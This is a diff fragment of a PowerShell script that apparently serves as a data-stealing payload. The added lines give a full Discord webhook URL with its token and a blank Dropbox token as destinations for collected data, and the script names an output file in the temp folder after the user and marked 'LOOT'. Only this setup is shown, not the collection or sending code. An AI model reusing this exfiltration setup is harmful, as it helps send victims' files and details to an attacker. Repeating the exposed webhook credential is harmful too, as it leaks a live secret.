@@ -1,3 +1,9 @@
+# Define the Discord webhook URL
+$dc = 'https://discord.com/api/webhooks/1264728039682740356/RjUIrKfIKnpBH3npIAWT-M7YZ0KfwCzVmkgGp8yF2Bv3hagAgVVdSucimNeswCoiStR3'
+
+# Define the Dropbox token
+$db = '' # Add your Dropbox token here
+
 $FileName = "$env:TEMP\$env:USERNAME-LOOT-$(Get-Date -Format yyyy-MM-dd_hh-mm).txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
